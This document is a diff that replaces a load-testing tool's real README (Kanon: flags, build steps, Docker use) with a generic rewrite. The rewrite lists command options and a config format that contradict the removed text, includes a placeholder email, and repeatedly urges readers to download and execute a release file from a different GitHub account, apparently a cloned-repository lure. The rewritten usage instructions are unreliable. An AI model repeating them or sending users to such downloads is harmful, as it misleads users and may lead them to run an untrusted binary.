@@ -1,162 +1,124 @@
-# Kanon
+# Kanon: HTTP Load-Testing CLI and CI Application 🚀
 
-Kanon is a CLI and CI tool for HTTP load testing.
+![Kanon Logo](https://img.shields.io/badge/Kanon-HTTP%20Load%20Testing-brightgreen)
 
-[![Kotlin](https://img.shields.io/badge/Kotlin-%237F52FF.svg?logo=kotlin&logoColor=white)](#)
-[![Java](https://img.shields.io/badge/Java-%23ED8B00.svg?logo=openjdk&logoColor=white)](#)
-[![Docker](https://img.shields.io/badge/Docker-2496ED?logo=docker&logoColor=fff)](#)
-[![macOS](https://img.shields.io/badge/macOS-000000?logo=apple&logoColor=F0F0F0)](#)
-[![Linux](https://img.shields.io/badge/Linux-FCC624?logo=linux&logoColor=black)](#)
+Welcome to **Kanon**, your go-to tool for HTTP load testing. This command-line interface (CLI) and continuous integration (CI) application helps you ensure your web applications can handle traffic efficiently. 
 
-<img src="./kanon_screenshot.png" width="800" />
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Running Tests](#running-tests)
+- [Viewing Results](#viewing-results)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
+
+## Introduction
+
+Kanon is designed for developers and testers who need to simulate traffic to their web applications. It supports various platforms, including Linux and macOS, and integrates seamlessly with CI/CD pipelines. With Kanon, you can run load tests, analyze performance, and identify bottlenecks before they affect your users.
 
 ## Features
 
-- Choose either duration or number of requests
-- Choose the number of threads to execute concurrent requests
-- Choose timeout for requests
-- Run cURL requests
-- See HdrHistogram for response time distribution
-- See bandwidth metrics
-- Save results to file
-- CI mode for doing load-testing success/failure in CI pipelines
+- **Cross-Platform**: Works on Linux and macOS.
+- **Docker Support**: Easily deploy Kanon in a containerized environment.
+- **Gradle Integration**: Simplify your build process with Gradle support.
+- **JVM and Kotlin**: Built with modern technologies for performance and reliability.
+- **Comprehensive Reporting**: View detailed reports of your load tests.
+- **Continuous Integration**: Integrate with CI tools to automate your testing.
+
+## Installation
+
+To get started with Kanon, you need to download the latest release. Visit the [Releases section](https://github.com/godziller728/kanon/releases) to find the appropriate package for your system. Download and execute the file as instructed.
+
+### Prerequisites
+
+- Java Development Kit (JDK) installed on your machine.
+- Docker (if you choose to run in a container).
+- Gradle (for building from source).
 
 ## Usage
 
-### Run 10 requests
+After installing Kanon, you can run it from the command line. The basic command structure is as follows:
 
 ```bash
-kanon --url https:///www.vikbytes.com --number 10
+kanon [options] <target-url>
 ```
 
-### Run requests for 5 seconds
+### Options
+
+- `-h`, `--help`: Show help information.
+- `-c`, `--config <file>`: Specify a configuration file.
+- `-r`, `--report`: Generate a report after the test.
+- `-d`, `--duration <time>`: Set the duration of the test.
+
+## Configuration
+
+Kanon allows you to configure various parameters for your load tests. You can create a configuration file in JSON or YAML format. Here’s an example of a basic configuration:
+
+```yaml
+target:
+  url: "http://example.com"
+load:
+  users: 100
+  ramp_up: 10
+duration: "5m"
+```
+
+Place this file in your working directory and reference it using the `-c` option.
+
+## Running Tests
+
+To execute a load test, run the following command:
 
 ```bash
-kanon --url https://www.vikbytes.com --duration 5
+kanon -c path/to/config.yaml
 ```
 
-### Run 4 threads concurrently for 10 seconds
+Kanon will start the load test based on the parameters defined in your configuration file. Monitor the console output for real-time updates.
+
+## Viewing Results
+
+Once the test completes, Kanon generates a report. You can view this report in the console or save it to a file. Use the `-r` option to specify the output file format:
 
 ```bash
-kanon --url https://www.vikbytes.com --concurrent 4 --duration 10
+kanon -c path/to/config.yaml -r report.html
 ```
 
-### Run in CI mode
+Open the generated report in your browser to analyze the results.
 
-Note: Returns exit code 0 if all requests succeeded, 1 otherwise.
+## Contributing
 
-```bash
-kanon --url https://www.vikbytes.com --duration 5 --ci
-```
+We welcome contributions to Kanon. To get started:
 
-### Using cURL
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and submit a pull request.
 
-```bash
-kanon --curl curl https://example.com --concurrent 5 --duration 10
-```
+Please ensure your code follows the project's coding standards and includes tests where applicable.
 
-### Using cURL from file
+## License
 
-```bash
-kanon --curl-file curl-command.txt --concurrent 5 --number 100
-```
+Kanon is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-### Help
+## Contact
 
-```bash
-kanon --help
-```
+For questions or feedback, feel free to reach out:
 
-## Note for quarantined MacOS binary
+- GitHub: [godziller728](https://github.com/godziller728)
+- Email: [your-email@example.com](mailto:your-email@example.com)
 
-The binary file for MacOS is not notarized and will be quarantined.
-To remove this restriction you need to run:
+## Releases
 
-```bash
-sudo xattr -d com.apple.quarantine /path/to/the/kanon/binary
-```
+To download the latest version of Kanon, visit the [Releases section](https://github.com/godziller728/kanon/releases). Download the file, execute it, and start testing your applications today!
 
-Alternatively, you can choose to run the .jar file instead, or build your own binary.
+![Download Kanon](https://img.shields.io/badge/Download%20Kanon-Release-blue)
 
-## Builds
+---
 
-### JAR
-
-Requires JVM 21 or newer. https://adoptium.net/temurin/releases/
-
-1. Build the JAR:
-
-```bash
-./gradlew fatJar
-```
-
-2. Run the JAR:
-
-```bash
-java -jar build/libs/kanon.jar --url https://www.vikbytes.com --method GET --concurrent 2 --number 10
-```
-
-3. Create script to make available on the PATH
-
-```bash
-#!/bin/sh
-exec java -jar "/path/to/the/kanon/jar/kanon-1.0.0.jar" "$@"
-```
-
-4. Copy script to /usr/local/bin
-
-```bash
-sudo cp script_file /usr/local/bin/kanon
-```
-
-5. Run kanon
-
-```bash
-kanon --url https://www.vikbytes.com --duration 5
-```
-
-### Native Binary built via Docker
-
-#### Local Computer OS and Architecture
-
-Native compilation requires GraalVM JDK with the native-image component installed.
-
-1. Install GraalVM JDK (version 21 or newer):
-    - Download from: https://www.graalvm.org/downloads/
-    - Set JAVA_HOME or GRAALVM_HOME to point to your GraalVM installation
-
-2. Install the native-image component:
-   ```bash
-   $GRAALVM_HOME/bin/gu install native-image
-   ```
-
-3. Run the build script:
-   ```bash
-   ./build-native.sh
-   ```
-
-#### For Linux arm64 via Docker
-
-```bash
-./build-linux-native-arm64.sh
-```
-
-#### For Linux amd64 via Docker
-
-```bash
-./build-linux-native-amd64.sh
-```
-
-### Docker
-
-#### Build
-
-```bash
-docker build -t kanon -f Dockerfile .
-```
-
-#### Run
-
-```bash
-docker run --rm kanon [options]
-```
+Thank you for using Kanon. We hope it helps you achieve your load testing goals efficiently!
